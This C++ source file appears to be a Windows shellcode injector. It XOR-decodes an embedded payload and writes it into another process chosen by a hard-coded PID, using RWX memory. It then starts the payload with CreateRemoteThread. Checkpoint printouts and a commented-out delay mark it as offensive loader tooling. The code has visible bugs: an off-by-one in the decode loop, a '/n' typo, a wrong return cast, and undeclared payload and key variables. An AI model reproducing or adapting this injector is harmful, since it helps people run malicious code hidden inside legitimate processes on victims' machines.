#include <stdio.h>
#include <Windows.h>
#include <memoryapi.h>

#include <cstdint>
#include <iostream>
#include "resource.h"

using namespace std;
char XorCipher(u_char data[], int datalen, u_char key[], int keylen) {

	cout << "[+] XorCipher checkpoint" << "\n";

	int charlen = sizeof(char);
	for (int i = 0; i < datalen - 1; i++) {
		data[i] = data[i] ^ key[i % keylen / charlen];
	}
	cout << "[*] Payload parsed" << "/n";
	return (char)data;
}
int main() {

	HANDLE hThread;
	HANDLE hProcess;
	VOID* exec_memory;
	UCHAR bPayload;

	cout << "[+] Main checkpoint" << "\n";
	cout << "[*] Delay execution" << "\n";
	//Sleep(5000);

	hProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, 12332);
	exec_memory = VirtualAllocEx(hProcess, NULL, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	bPayload = XorCipher(payload, payloadlen, key, keylen);
	WriteProcessMemory(hProcess, exec_memory, (LPCVOID)payload, sizeof(payload), NULL);

	hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)exec_memory, NULL, 0, NULL);

	CloseHandle(hProcess);
	return 0;
}
